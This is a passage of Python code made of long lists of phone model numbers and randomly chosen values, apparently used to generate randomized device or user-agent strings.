        'M225FV',
        'M236B',
        'M236Q',
        'M305F',
        'M305M',
        'M307F',
        'M307FN',
        'M315F',
        'M317F',
        'M325FV',
        'M325F',
        'M326B',
        'M336B',
        'M336BU',
        'M405F',
        'M426B',
        'M515F',
        'M526BR',
        'M526B',
        'M536B',
        'M625F',
        'G750H',
        'G7508Q',
        'G7509',
        'N970U',
        'N970F',
        'N971N',
        'N970U1',
        'N770F',
        'N975U1',
        'N975U',
        'N975F',
        'N975F',
        'N976N',
        'N980F',
        'N981U',
        'N981B',
        'N985F',
        'N9860',
        'N986N',
        'N986U',
        'N986B',
        'N986W',
        'N9008V',
        'N9006',
        'N900A',
        'N9005',
        'N900W8',
        'N900',
        'N9009',
        'N900P',
        'N9000Q',
        'N9002',
        '9005',
        'N750L',
        'N7505',
        'N750',
        'N7502',
        'N910F',
        'N910V',
        'N910C',
        'N910U',
        'N910H',
        'N9108V',
        'N9100',
        'N915FY',
        'N9150',
        'N915T',
        'N915G',
        'N915A',
        'N915F',
        'N915S',
        'N915D',
        'N915W8',
        'N916S',
        'N916K',
        'N916L',
        'N916LSK',
        'N920L',
        'N920S',
        'N920G',
        'N920A',
        'N920C',
        'N920V',
        'N920I',
        'N920K',
        'N9208',
        'N930F',
        'N9300',
        'N930x',
        'N930P',
        'N930X',
        'N930W8',
        'N930V',
        'N930T',
        'N950U',
        'N950F',
        'N950N',
        'N960U',
        'N960F',
        'N960U',
        'N935F',
        'N935K',
        'N935S',
        'G550T',
        'G550FY',
        'G5500',
        'G5510',
        'G550T1',
        'S550TL',
        'G5520',
        'G5528',
        'G600FY',
        'G600F',
        'G6000',
        'G6100',
        'G610S',
        'G611F',
        'G611L',
        'G110M',
        'G110H',
        'G110B',
        'G910S',
        'G316HU',
        'G977N',
        'G973U1',
        'G973F',
        'G973W',
        'G973U',
        'G770U1',
        'G770F',
        'G975F',
        'G975U',
        'G970U',
        'G970U1',
        'G970F',
        'G970N',
        'G980F',
        'G981U',
        'G981N',
        'G981B',
        'G780G',
        'G780F',
        'G781W',
        'G781U',
        'G7810',
        'G9880',
        'G988B',
        'G988U',
        'G988B',
        'G988U1',
        'G985F',
        'G986U',
        'G986B',
        'G986W',
        'G986U1',
        'G991U',
        'G991B',
        'G990B',
        'G990E',
        'G990U',
        'G998U',
        'G996W',
        'G996U',
        'G996N',
        'G9960',
        'S901U',
        'S901B',
        'S908U',
        'S908U1',
        'S908B',
        'S9080',
        'S908N',
        'S908E',
        'S906U',
        'S906E',
        'S906N',
        'S906B',
        'S906U1',
        'G730V',
        'G730A',
        'G730W8',
        'C105L',
        'C101',
        'C105',
        'C105K',
        'C105S',
        'G900F',
        'G900P',
        'G900H',
        'G9006V',
        'G900M',
        'G900V',
        'G870W',
        'G890A',
        'G870A',
        'G900FD',
        'G860P',
        'G901F',
        'G901F',
        'G800F',
        'G800H',
        'G903F',
        'G903W',
        'G920F',
        'G920K',
        'G920I',
        'G920A',
        'G920P',
        'G920S',
        'G920V',
        'G920T',
        'G925F',
        'G925A',
        'G925W8',
        'G928F',
        'G928C',
        'G9280',
        'G9287',
        'G928T',
        'G928I',
        'G930A',
        'G930F',
        'G930W8',
        'G930S',
        'G930V',
        'G930P',
        'G930L',
        'G891A',
        'G935F',
        'G935T',
        'G935W8',
        'G9350',
        'G950F',
        'G950W',
        'G950U',
        'G892A',
        'G892U',
        'G8750',
        'G955F',
        'G955U',
        'G955U1',
        'G955W',
        'G955N',
        'G960U',
        'G960U1',
        'G960F',
        'G965U',
        'G965F',
        'G965U1',
        'G965N',
        'G9650',
        'J321AZ',
        'J326AZ',
        'J336AZ',
        'T116',
        'T116NU',
        'T116NY',
        'T116NQ',
        'T2519',
        'G318HZ',
        'T255S',
        'W2016',
        'W2018',
        'W2019',
        'W2021',
        'W2022',
        'G600S',
        'E426S',
        'G3812',
        'G3812B',
        'G3818',
        'G388F',
        'G389F',
        'G390F',
        'G398FN']
    gt = [
        'GT-1015',
        'GT-1020',
        'GT-1030',
        'GT-1035',
        'GT-1040',
        'GT-1045',
        'GT-1050',
        'GT-1240',
        'GT-1440',
        'GT-1450',
        'GT-18190',
        'GT-18262',
        'GT-19060I',
        'GT-19082',
        'GT-19083',
        'GT-19105',
        'GT-19152',
        'GT-19192',
        'GT-19300',
        'GT-19505',
        'GT-2000',
        'GT-20000',
        'GT-200s',
        'GT-3000',
        'GT-414XOP',
        'GT-6918',
        'GT-7010',
        'GT-7020',
        'GT-7030',
        'GT-7040',
        'GT-7050',
        'GT-7100',
        'GT-7105',
        'GT-7110',
        'GT-7205',
        'GT-7210',
        'GT-7240R',
        'GT-7245',
        'GT-7303',
        'GT-7310',
        'GT-7320',
        'GT-7325',
        'GT-7326',
        'GT-7340',
        'GT-7405',
        'GT-7550 5GT-8005',
        'GT-8010',
        'GT-81',
        'GT-810',
        'GT-8105',
        'GT-8110',
        'GT-8220S',
        'GT-8410',
        'GT-9300',
        'GT-9320',
        'GT-93G',
        'GT-A7100',
        'GT-A9500',
        'GT-ANDROID',
        'GT-B2710',
        'GT-B5330',
        'GT-B5330B',
        'GT-B5330L',
        'GT-B5330ZKAINU',
        'GT-B5510',
        'GT-B5512',
        'GT-B5722',
        'GT-B7510',
        'GT-B7722',
        'GT-B7810',
        'GT-B9150',
        'GT-B9388',
        'GT-C3010',
        'GT-C3262',
        'GT-C3310R',
        'GT-C3312',
        'GT-C3312R',
        'GT-C3313T',
        'GT-C3322',
        'GT-C3322i',
        'GT-C3520',
        'GT-C3520I',
        'GT-C3592',
        'GT-C3595',
        'GT-C3782',
        'GT-C6712',
        'GT-E1282T',
        'GT-E1500',
        'GT-E2200',
        'GT-E2202',
        'GT-E2250',
        'GT-E2252',
        'GT-E2600',
        'GT-E2652W',
        'GT-E3210',
        'GT-E3309',
        'GT-E3309I',
        'GT-E3309T',
        'GT-G530H',
        'GT-g900f',
        'GT-G930F',
        'GT-H9500',
        'GT-I5508',
        'GT-I5801',
        'GT-I6410',
        'GT-I8150',
        'GT-I8160OKLTPA',
        'GT-I8160ZWLTTT',
        'GT-I8258',
        'GT-I8262D',
        'GT-I8268',
        'GT-I8505',
        'GT-I8530BAABTU',
        'GT-I8530BALCHO',
        'GT-I8530BALTTT',
        'GT-I8550E',
        'GT-i8700',
        'GT-I8750',
        'GT-I900',
        'GT-I9008L',
        'GT-i9040',
        'GT-I9080E',
        'GT-I9082C',
        'GT-I9082EWAINU',
        'GT-I9082i',
        'GT-I9100G',
        'GT-I9100LKLCHT',
        'GT-I9100M',
        'GT-I9100P',
        'GT-I9100T',
        'GT-I9105UANDBT',
        'GT-I9128E',
        'GT-I9128I',
        'GT-I9128V',
        'GT-I9158P',
        'GT-I9158V',
        'GT-I9168I',
        'GT-I9192I',
        'GT-I9195H',
        'GT-I9195L',
        'GT-I9250',
        'GT-I9303I',
        'GT-I9305N',
        'GT-I9308I',
        'GT-I9505G',
        'GT-I9505X',
        'GT-I9507V',
        'GT-I9600',
        'GT-m190',
        'GT-M5650',
        'GT-mini',
        'GT-N5000S',
        'GT-N5100',
        'GT-N5105',
        'GT-N5110',
        'GT-N5120',
        'GT-N7000B',
        'GT-N7005',
        'GT-N7100T',
        'GT-N7102',
        'GT-N7105',
        'GT-N7105T',
        'GT-N7108',
        'GT-N7108D',
        'GT-N8000',
        'GT-N8005',
        'GT-N8010',
        'GT-N8020',
        'GT-N9000',
        'GT-N9505',
        'GT-P1000CWAXSA',
        'GT-P1000M',
        'GT-P1000T',
        'GT-P1010',
        'GT-P3100B',
        'GT-P3105',
        'GT-P3108',
        'GT-P3110',
        'GT-P5100',
        'GT-P5200',
        'GT-P5210XD1',
        'GT-P5220',
        'GT-P6200',
        'GT-P6200L',
        'GT-P6201',
        'GT-P6210',
        'GT-P6211',
        'GT-P6800',
        'GT-P7100',
        'GT-P7300',
        'GT-P7300B',
        'GT-P7310',
        'GT-P7320',
        'GT-P7500D',
        'GT-P7500M',
        'GT-P7500R',
        'GT-P7500V',
        'GT-P7501',
        'GT-P7511',
        'GT-S3330',
        'GT-S3332',
        'GT-S3333',
        'GT-S3370',
        'GT-S3518',
        'GT-S3570',
        'GT-S3600i',
        'GT-S3650',
        'GT-S3653W',
        'GT-S3770K',
        'GT-S3770M',
        'GT-S3800W',
        'GT-S3802',
        'GT-S3850',
        'GT-S5220',
        'GT-S5220R',
        'GT-S5222',
        'GT-S5230',
        'GT-S5230W',
        'GT-S5233T',
        'GT-s5233w',
        'GT-S5250',
        'GT-S5253',
        'GT-s5260',
        'GT-S5280',
        'GT-S5282',
        'GT-S5283B',
        'GT-S5292',
        'GT-S5300',
        'GT-S5300L',
        'GT-S5301',
        'GT-S5301B',
        'GT-S5301L',
        'GT-S5302',
        'GT-S5302B',
        'GT-S5303',
        'GT-S5303B',
        'GT-S5310',
        'GT-S5310B',
        'GT-S5310C',
        'GT-S5310E',
        'GT-S5310G',
        'GT-S5310I',
        'GT-S5310L',
        'GT-S5310M',
        'GT-S5310N',
        'GT-S5312',
        'GT-S5312B',
        'GT-S5312C',
        'GT-S5312L',
        'GT-S5330',
        'GT-S5360',
        'GT-S5360B',
        'GT-S5360L',
        'GT-S5360T',
        'GT-S5363',
        'GT-S5367',
        'GT-S5369',
        'GT-S5380',
        'GT-S5380D',
        'GT-S5500',
        'GT-S5560',
        'GT-S5560i',
        'GT-S5570B',
        'GT-S5570I',
        'GT-S5570L',
        'GT-S5578',
        'GT-S5600',
        'GT-S5603',
        'GT-S5610',
        'GT-S5610K',
        'GT-S5611',
        'GT-S5620',
        'G-S5670',
        'GT-S5670B',
        'GT-S5670HKBZTA',
        'GT-S5690',
        'GT-S5690R',
        'GT-S5830',
        'GT-S5830D',
        'GT-S5830G',
        'GT-S5830i',
        'GT-S5830L',
        'GT-S5830M',
        'GT-S5830T',
        'GT-S5830V',
        'GT-S5831i',
        'GT-S5838',
        'GT-S5839i',
        'GT-S6010',
        'GT-S6010BBABTU',
        'GT-S6012',
        'GT-S6012B',
        'GT-S6102',
        'GT-S6102B',
        'GT-S6293T',
        'GT-S6310B',
        'GT-S6310ZWAMID',
        'GT-S6312',
        'GT-S6313T',
        'GT-S6352',
        'GT-S6500',
        'GT-S6500D',
        'GT-S6500L',
        'GT-S6790',
        'GT-S6790L',
        'GT-S6790N',
        'GT-S6792L',
        'GT-S6800',
        'GT-S6800HKAXFA',
        'GT-S6802',
        'GT-S6810',
        'GT-S6810B',
        'GT-S6810E',
        'GT-S6810L',
        'GT-S6810M',
        'GT-S6810MBASER',
        'GT-S6810P',
        'GT-S6812',
        'GT-S6812B',
        'GT-S6812C',
        'GT-S6812i',
        'GT-S6818',
        'GT-S6818V',
        'GT-S7230E',
        'GT-S7233E',
        'GT-S7250D',
        'GT-S7262',
        'GT-S7270',
        'GT-S7270L',
        'GT-S7272',
        'GT-S7272C',
        'GT-S7273T',
        'GT-S7278',
        'GT-S7278U',
        'GT-S7390',
        'GT-S7390G',
        'GT-S7390L',
        'GT-S7392',
        'GT-S7392L',
        'GT-S7500',
        'GT-S7500ABABTU',
        'GT-S7500ABADBT',
        'GT-S7500ABTTLP',
        'GT-S7500CWADBT',
        'GT-S7500L',
        'GT-S7500T',
        'GT-S7560',
        'GT-S7560M',
        'GT-S7562',
        'GT-S7562C',
        'GT-S7562i',
        'GT-S7562L',
        'GT-S7566',
        'GT-S7568',
        'GT-S7568I',
        'GT-S7572',
        'GT-S7580E',
        'GT-S7583T',
        'GT-S758X',
        'GT-S7592',
        'GT-S7710',
        'GT-S7710L',
        'GT-S7898',
        'GT-S7898I',
        'GT-S8500',
        'GT-S8530',
        'GT-S8600',
        'GT-STB919',
        'GT-T140',
        'GT-T150',
        'GT-V8a',
        'GT-V8i',
        'GT-VC818',
        'GT-VM919S',
        'GT-W131',
        'GT-W153',
        'GT-X831',
        'GT-X853',
        'GT-X870',
        'GT-X890',
        'GT-Y8750']
    rao = random.choice([
        'CE7',
        'CE7j',
        'CE9h',
        'KE6',
        'KE6j',
        'KF6',
        'KE7',
        'LC8',
        'KD6a',
        'LD7',
        'LD7j',
        'MZ-TECNO LD7',
        'KF6',
        'KF6j',
        'KF6i',
        'KF6k',
        'PR651h',
        'PR651',
        'PR651E',
        'KF6m',
        'KF6h',
        'KF6n'])
    brook = random.choice([
        'X38',
        'C65023',
        'C6506',
        'C6502',
        'D6503',
        'D6502',
        'Xperia Z2',
        'D6633',
        'D6603',
        'D6643',
        'D6616',
        'D6708',
        'D6563',
        'F5122',
        'F5121',
        'E6633',
        'E5553',
        'E6533',
        'E5333'])
    viv = random.choice([
        '2022',
        '2023',
        '2024',
        '2027',
        '2005',
        '2005A',
        '2002A',
        '1955A',
        '1962',
        '1945A',
        '1945T',
        '1937',
        '1938',
        '1938CT',
        '1938T',
        '1940',
        '1935',
        '1936A',
        '1933',
        '1934A',
        '1930A',
        '1930T',
        '1927',
        '1928',
        '1928A',
        '1922A',
        '1923A',
        '1921',
        '1921A',
        '1921T',
        '1915',
        '1916',
        '1908',
        '1909',
        '1832A',
        '1832T',
        '1831A',
        '1831T',
        '1824A',
        '1824BA',
        '1817',
        '1818',
        '1814',
        '1815',
        '1816',
        '1727',
        '1730',
        '1718',
        '1719',
        '1723',
        '1724',
        '1725',
        '1601',
        '1606',
        'F1403',
        '2109',
        '2111',
        '2080A',
        '2085A',
        '2072A',
        '2073A',
        '2056A',
        '2054A',
        '2057A',
        '2047',
        '2037',
        '2036',
        '2038'])
    vmo = random.choice([
        '1902',
        '1906',
        '1901',
        '1904',
        '1938CT',
        '1723',
        '1940',
        '1928A',
        '1909'])
    rmx = random.choice([
        'RMX1941',
        'RMX1945',
        'RMX1921',
        'RMX1901'])
    poc = random.choice([
        'SM-M045F',
        'SM-M045F/DS',
        'SM-T509',
        'SM-A042F',
        'SM-A042F/DS',
        'SM-A042M',
        'SM-A042M/DS',
        'SM-A047F',
        'SM-A047F/DS',
        'SM-A047F/DSN',
        'SM-A045F',
        'SM-A045F/DS',
        'SM-M136B',
        'SM-M136B/DS'])
    gtp = random.choice([
        'GT-1015',
        'GT-1020',
        'GT-1030',
        'GT-1035',
        'GT-1040',
        'GT-1045',
        'GT-1050',
        'GT-1240',
        'GT-1440',
        'GT-1450',
        'GT-18190',
        'GT-18262',
        'GT-19060I',
        'GT-19082',
        'GT-19083',
        'GT-19105',
        'GT-19152',
        'GT-19192',
        'GT-19300',
        'GT-19505',
        'GT-2000',
        'GT-20000',
        'GT-200s',
        'GT-3000',
        'GT-414XOP',
        'GT-6918',
        'GT-7010',
        'GT-7020',
        'GT-7030',
        'GT-7040',
        'GT-7050',
        'GT-7100',
        'GT-7105',
        'GT-7110',
        'GT-7205',
        'GT-7210',
        'GT-7240R',
        'GT-7245',
        'GT-7303',
        'GT-7310',
        'GT-7320',
        'GT-7325',
        'GT-7326',
        'GT-7340',
        'GT-7405',
        'GT-7550   5GT-8005',
        'GT-8010',
        'GT-81',
        'GT-810',
        'GT-8105',
        'GT-8110',
        'GT-8220S',
        'GT-8410',
        'GT-9300',
        'GT-9320',
        'GT-93G',
        'GT-A7100',
        'GT-A9500',
        'GT-ANDROID',
        'GT-B2710',
        'GT-B5330',
        'GT-B5330B',
        'GT-B5330L',
        'GT-B5330ZKAINU',
        'GT-B5510',
        'GT-B5512',
        'GT-B5722',
        'GT-B7510',
        'GT-B7722',
        'GT-B7810',
        'GT-B9150',
        'GT-B9388',
        'GT-C3010',
        'GT-C3262',
        'GT-C3310R',
        'GT-C3312',
        'GT-C3312R',
        'GT-C3313T',
        'GT-C3322',
        'GT-C3322i',
        'GT-C3520',
        'GT-C3520I',
        'GT-C3592',
        'GT-C3595',
        'GT-C3782',
        'GT-C6712',
        'GT-E1282T',
        'GT-E1500',
        'GT-E2200',
        'GT-E2202',
        'GT-E2250',
        'GT-E2252',
        'GT-E2600',
        'GT-E2652W',
        'GT-E3210',
        'GT-E3309',
        'GT-E3309I',
        'GT-E3309T',
        'GT-G530H',
        'GT-g900f',
        'GT-G930F',
        'GT-H9500',
        'GT-I5508',
        'GT-I5801',
        'GT-I6410',
        'GT-I8150',
        'GT-I8160OKLTPA',
        'GT-I8160ZWLTTT',
        'GT-I8258',
        'GT-I8262D',
        'GT-I8268',
        'GT-I8505',
        'GT-I8530BAABTU',
        'GT-I8530BALCHO',
        'GT-I8530BALTTT',
        'GT-I8550E',
        'GT-i8700',
        'GT-I8750',
        'GT-I900',
        'GT-I9008L',
        'GT-i9040',
        'GT-I9080E',
        'GT-I9082C',
        'GT-I9082EWAINU',
        'GT-I9082i',
        'GT-I9100G',
        'GT-I9100LKLCHT',
        'GT-I9100M',
        'GT-I9100P',
        'GT-I9100T',
        'GT-I9105UANDBT',
        'GT-I9128E',
        'GT-I9128I',
        'GT-I9128V',
        'GT-I9158P',
        'GT-I9158V',
        'GT-I9168I',
        'GT-I9192I',
        'GT-I9195H',
        'GT-I9195L',
        'GT-I9250',
        'GT-I9303I',
        'GT-I9305N',
        'GT-I9308I',
        'GT-I9505G',
        'GT-I9505X',
        'GT-I9507V',
        'GT-I9600',
        'GT-m190',
        'GT-M5650',
        'GT-mini',
        'GT-N5000S',
        'GT-N5100',
        'GT-N5105',
        'GT-N5110',
        'GT-N5120',
        'GT-N7000B',
        'GT-N7005',
        'GT-N7100T',
        'GT-N7102',
        'GT-N7105',
        'GT-N7105T',
        'GT-N7108',
        'GT-N7108D',
        'GT-N8000',
        'GT-N8005',
        'GT-N8010',
        'GT-N8020',
        'GT-N9000',
        'GT-N9505',
        'GT-P1000CWAXSA',
        'GT-P1000M',
        'GT-P1000T',
        'GT-P1010',
        'GT-P3100B',
        'GT-P3105',
        'GT-P3108',
        'GT-P3110',
        'GT-P5100',
        'GT-P5200',
        'GT-P5210XD1',
        'GT-P5220',
        'GT-P6200',
        'GT-P6200L',
        'GT-P6201',
        'GT-P6210',
        'GT-P6211',
        'GT-P6800',
        'GT-P7100',
        'GT-P7300',
        'GT-P7300B',
        'GT-P7310',
        'GT-P7320',
        'GT-P7500D',
        'GT-P7500M',
        'GT-P7500R',
        'GT-P7500V',
        'GT-P7501',
        'GT-P7511',
        'GT-S3330',
        'GT-S3332',
        'GT-S3333',
        'GT-S3370',
        'GT-S3518',
        'GT-S3570',
        'GT-S3600i',
        'GT-S3650',
        'GT-S3653W',
        'GT-S3770K',
        'GT-S3770M',
        'GT-S3800W',
        'GT-S3802',
        'GT-S3850',
        'GT-S5220',
        'GT-S5220R',
        'GT-S5222',
        'GT-S5230',
        'GT-S5230W',
        'GT-S5233T',
        'GT-s5233w',
        'GT-S5250',
        'GT-S5253',
        'GT-s5260',
        'GT-S5280',
        'GT-S5282',
        'GT-S5283B',
        'GT-S5292',
        'GT-S5300',
        'GT-S5300L',
        'GT-S5301',
        'GT-S5301B',
        'GT-S5301L',
        'GT-S5302',
        'GT-S5302B',
        'GT-S5303',
        'GT-S5303B',
        'GT-S5310',
        'GT-S5310B',
        'GT-S5310C',
        'GT-S5310E',
        'GT-S5310G',
        'GT-S5310I',
        'GT-S5310L',
        'GT-S5310M',
        'GT-S5310N',
        'GT-S5312',
        'GT-S5312B',
        'GT-S5312C',
        'GT-S5312L',
        'GT-S5330',
        'GT-S5360',
        'GT-S5360B',
        'GT-S5360L',
        'GT-S5360T',
        'GT-S5363',
        'GT-S5367',
        'GT-S5369',
        'GT-S5380',
        'GT-S5380D',
        'GT-S5500',
        'GT-S5560',
        'GT-S5560i',
        'GT-S5570B',
        'GT-S5570I',
        'GT-S5570L',
        'GT-S5578',
        'GT-S5600',
        'GT-S5603',
        'GT-S5610',
        'GT-S5610K',
        'GT-S5611',
        'GT-S5620',
        'GT-S5670',
        'GT-S5670B',
        'GT-S5670HKBZTA',
        'GT-S5690',
        'GT-S5690R',
        'GT-S5830',
        'GT-S5830D',
        'GT-S5830G',
        'GT-S5830i',
        'GT-S5830L',
        'GT-S5830M',
        'GT-S5830T',
        'GT-S5830V',
        'GT-S5831i',
        'GT-S5838',
        'GT-S5839i',
        'GT-S6010',
        'GT-S6010BBABTU',
        'GT-S6012',
        'GT-S6012B',
        'GT-S6102',
        'GT-S6102B',
        'GT-S6293T',
        'GT-S6310B',
        'GT-S6310ZWAMID',
        'GT-S6312',
        'GT-S6313T',
        'GT-S6352',
        'GT-S6500',
        'GT-S6500D',
        'GT-S6500L',
        'GT-S6790',
        'GT-S6790L',
        'GT-S6790N',
        'GT-S6792L',
        'GT-S6800',
        'GT-S6800HKAXFA',
        'GT-S6802',
        'GT-S6810',
        'GT-S6810B',
        'GT-S6810E',
        'GT-S6810L',
        'GT-S6810M',
        'GT-S6810MBASER',
        'GT-S6810P',
        'GT-S6812',
        'GT-S6812B',
        'GT-S6812C',
        'GT-S6812i',
        'GT-S6818',
        'GT-S6818V',
        'GT-S7230E',
        'GT-S7233E',
        'GT-S7250D',
        'GT-S7262',
        'GT-S7270',
        'GT-S7270L',
        'GT-S7272',
        'GT-S7272C',
        'GT-S7273T',
        'GT-S7278',
        'GT-S7278U',
        'GT-S7390',
        'GT-S7390G',
        'GT-S7390L',
        'GT-S7392',
        'GT-S7392L',
        'GT-S7500',
        'GT-S7500ABABTU',
        'GT-S7500ABADBT',
        'GT-S7500ABTTLP',
        'GT-S7500CWADBT',
        'GT-S7500L',
        'GT-S7500T',
        'GT-S7560',
        'GT-S7560M',
        'GT-S7562',
        'GT-S7562C',
        'GT-S7562i',
        'GT-S7562L',
        'GT-S7566',
        'GT-S7568',
        'GT-S7568I',
        'GT-S7572',
        'GT-S7580E',
        'GT-S7583T',
        'GT-S758X',
        'GT-S7592',
        'GT-S7710',
        'GT-S7710L',
        'GT-S7898',
        'GT-S7898I',
        'GT-S8500',
        'GT-S8530',
        'GT-S8600',
        'GT-STB919',
        'GT-T140',
        'GT-T150',
        'GT-V8a',
        'GT-V8i',
        'GT-VC818',
        'GT-VM919S',
        'GT-W131',
        'GT-W153',
        'GT-X831',
        'GT-X853',
        'GT-X870',
        'GT-X890',
        'GT-Y8750'])
    son = random.choice([
        'H8324',
        'H8314',
        'SO-05K',
        'XQ-AU51',
        'XQ-AU52',
        'XQ-AT51',
        'XQ-AT52',
        'SOG01',
        'SO-52A',
        'XQ-AS52',
        'XQ-AS62',
        'XQ-AS72',
        'A002SO, SOG02'])
    rot = random.choice([
        'HUAWEIMYA-L03',
        'HUAWEIMYA-L23',
        'HUAWEIMYA-L02',
        'HUAWEIMYA-L22',
        'HUAWEIMYA-U29',
        'HUAWEIMYA-L13'])
    ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 140)) + str(random.randint(111, 556))
    cph = random.choice([
        'CPH1979',
        'CPH1983',
        'CPH1987',
        'CPH2005',
        'CPH2009',
        'CPH2015',
        'CPH2059',
        'CPH2061',
        'CPH2065',
        'CPH2069',
        'CPH2071',
        'CPH2073',
        'CPH2077',
        'CPH2091',
        'CPH2095',
        'CPH2099',
        'CPH2137',
        'CPH2139',
        'CPH2145',
        'CPH2161',
        'CPH2185',
        'CPH2201',
        'CPH2209',
        'CPH1801',
        'CPH1803',
        'CPH1805',
        'CPH1809',
        'CPH1827',
        'CPH1837',
        'CPH1851',
        'CPH1853'])
    zov = random.choice([
        'LE2113',
        'LE2111',
        'LE2110',
        'LE2117',
        'LE2115',
        'LE2121',
        'LE2125',
        'LE2123',
        'LE2120',
        'LE2127',
        'EB2101',
        'EB2103',
        'DE2118',
        'DE2117',
        'DN2101',
        'DN2103',
        'MT2110',
        'MT2111'])
    rmx = random.choice([
        'RMX1603',
        'RMX1801',
        'RMX1805',
        'RMX1807',
        'RMX1809',
        'RMX1811',
        'RMX1821',
        'RMX1825',
        'RMX1827',
        'RMX1831',
        'RMX1833',
        'RMX1851',
        'RMX1901',
        'RMX1903',
        'RMX1911',
        'RMX1919',
        'RMX1921',
        'RMX1925',
        'RMX1931',
        'RMX1941',
        'RMX1945',
        'RMX1971',
        'RMX1991',
        'RMX1992',
        'RMX1993',
        'RMX2001',
        'RMX2002',
        'RMX2002',
        'RMX2002',
        'RMX2020',
        'RMX2020',
        'RMX2021',
        'RMX2025',
        'RMX2027',
        'RMX2027',
        'RMX2030',
        'RMX2032',
        'RMX2040',
        'RMX2040',
        'RMX2050',
        'RMX2051',
        'RMX2061',
        'RMX2063',
        'RMX2071',
        'RMX2072',
        'RMX2075',
        'RMX2076',
        'RMX2081',
        'RMX2083',
        'RMX2085',
        'RMX2086',
        'RMX2101',
        'RMX2103',
        'RMX2111',
        'RMX2111',
        'RMX2117',
        'RMX2121',
        'RMX2142',
        'RMX2144',
        'RMX2151',
        'RMX2155',
        'RMX2156',
        'RMX2161',
        'RMX2163',
        'RMX2170',
        'RMX2176',
        'RMX2180',
        'RMX2185',
        'RMX2189',
        'RMX2193',
        'RMX2195',
        'RMX2202',
        'RMX3031',
        'RMX3061',
        'RMX3063',
        'RMX3081',
        'RMX3085',
        'RMX3092',
        'RMX3171',
        'RMX3191',
        'RMX3193',
        'RMX3195',
        'RMX3197',
        'RMX3201',
        'RMX3231',
        'RMX3241',
        'RMX3242'])
    net = random.choice([
        '281',
        '282',
        '283',
        '284',
        '285',
        '286',
        '287',
        '288',
        '289',
        '290',
        '291',
        '292',
        '293',
        '382',
        '383',
        '370',
        '394',
        '301',
        '310',
        '311',
        '319',
        '350',
        '378',
        '360',
        '344'])
    noti = random.choice([
        '9',
        '10',
        '11',
        '12'])
    mmn = random.choice([
        'LM-V510N',
        'SM-G970F',
        'SM-A107M',
        'OnePlus BE2015',
        'OnePlus BE2025',
        'OnePlus BE2028',
        'HUAWEI MAR-LX1M',
        'Pixel 3',
        'SM-G996U',
        'SM-G980F',
        'SM-G960U',
        'HUAWEI MAR-LX1A',
        'CP3503L',
        'Coolpad 2039',
        'SM-A025G',
        'SM-J610FN',
        'LG-D802',
        'LG L40',
        'LMK200Z',
        'LMK200E',
        'LMK200B',
        'LM-K200'])
    hwi = random.choice([
        'YAL-L21',
        'ELE-L04',
        'LYA-L29',
        'ELE-L29',
        'VOG-L09',
        'MAR-LX1B',
        'HLK-AL00',
        'JNY-LX2',
        'MAR-LX3A'])
    gts = random.choice([
        'AD9',
        'AD8',
        'LG7n',
        'LG8n',
        'LG6n',
        'KG5p',
        'CI7n',
        'CI8',
        'CI8n',
        'CI6n',
        'CH6i'])
    tco = random.choice([
        'RB8S',
        'KC8S',
        'KC6',
        'KC2',
        'CC7',
        'CB7'])
    bio = random.choice([
        'SM-G6100',
        'SM-G610L',
        'SM-G610K',
        'SM-G615F',
        'SM-G615FU',
        'SM-J730G',
        'SM-J730GM',
        'SM-G9298',
        'SM-G615F, SM-G615FU',
        'SM-C7010',
        'SM-C701F',
        'SM-C7018',
        'SM-J710FN',
        'SM-A520F',
        'SM-A520F',
        'SM-A520K',
        'SM-A520L',
        'SM-A520S',
        'SM-A520W',
        'SM-A720F',
        'SM-A720S',
        'SM-C5010',
        'SM-C5018',
        'SM-C9000',
        'SM-C900F',
        'SM-C9008',
        'SM-C900Y',
        'SM-A8100',
        'SM-A810F',
        'SM-A810F',
        'SM-A810YZ',
        'SM-A810S',
        'SM-J111F',
        'SM-J110G',
        'SM-J110F',
        'SM-J110H',
        'SM-J110M',
        'SM-J110L',
        'SM-J111M',
        'SM-J105F',
        'SM-j105H',
        'SM-J105H',
        'SM-J105B',
        'SM-J105Y',
        'SM-J105M',
        'SM-G388F',
        'R3',
        'SM-J106F',
        'SM-J106B',
        'SM-J106H',
        'SM-J106M',
        'SM-J701F',
        'SM-J701F',
        'SM-J701M',
        'SM-J701MT',
        'SO-02H',
        'E5823',
        'E5803',
        'SM-J720F',
        'SM-J720F/DS',
        'SM-J720M',
        'SM-J720M/DS',
        'X00ID',
        'X00IS',
        'X00HDA',
        'ZC554KL',
        'XT1766',
        'XT1763',
        'G3116',
        'G3121',
        'G3112',
        'G3123',
        'G3125',
        'SM-A605FN',
        'SM-A605G',
        'SM-A605F',
        'SM-A605GN',
        'SM-A6050',
        'SM-A605K',
        'SM-A605X',
        'SM-A6058',
        'SM-A750F',
        'SM-A750FN',
        'SM-A750G',
        'SM-A750GN',
        'SM-A750C',
        'SM-A750X',
        'SM-A750N',
        'SM-G885F',
        'SM-G8850',
        'SM-G885Y',
        'SM-G885S',
        'SM-G8858',
        'SM-J111F',
        'SM-J110G',
        'SM-J110F',
        'SM-J110H',
        'SM-J110M',
        'SM-J110L',
        'SM-J111M',
        'SM-J105F',
        'SM-j105H',
        'SM-J105H',
        'SM-J105B',
        'SM-J105Y',
        'SM-J105M',
        'SM-G388F',
        'R3',
        'SM-J106F',
        'SM-J106B',
        'SM-J106H',
        'SM-J106M',
        'SM-J250F',
        'SM-J250G',
        'SM-J250F',
        'SM-J250M',
        'SM-J250Y',
        'SM-A260F',
        'SM-A260G',
        'SM-G532F',
        'SM-G532G',
        'SM-G532M',
        'SM-G532G',
        'SM-G532F',
        'SM-G532MT',
        'MT7-TL00',
        'MT7-L09',
        'MT7-TL10',
        'MT7-CL00',
        'MT7-UL00',
        'PRA-TL10',
        'PRA-TL20',
        'PRA-LA1',
        'PRA-LX1',
        'PRA-LX2',
        'TAG-L21',
        'PRA-AL00X',
        'TAG-L32',
        'PRA-LX3',
        'PRA-AL00',
        'EVA-L09',
        'EVA-L19',
        'EVA-L29',
        'EVA-AL10',
        'EVA-TL00',
        'EVA-AL00',
        'EVA-DL00',
        'SLA-L02',
        'SLA-L22',
        'SLA-L03',
        'SLA-L23',
        'WAS-LX1',
        'WAS-LX2',
        'WAS-LX3',
        'WAS-LX1A',
        'WAS-LX2J',
        'WAS-L03T',
        'WAS-AL00',
        'WAS-TL10',
        'POT-LX1',
        'POT-LX1AF',
        'POT-LX2J',
        'POT-LX1RUA',
        'POT-LX3',
        'HMA-L09',
        'HMA-LX9',
        'HMA-L29',
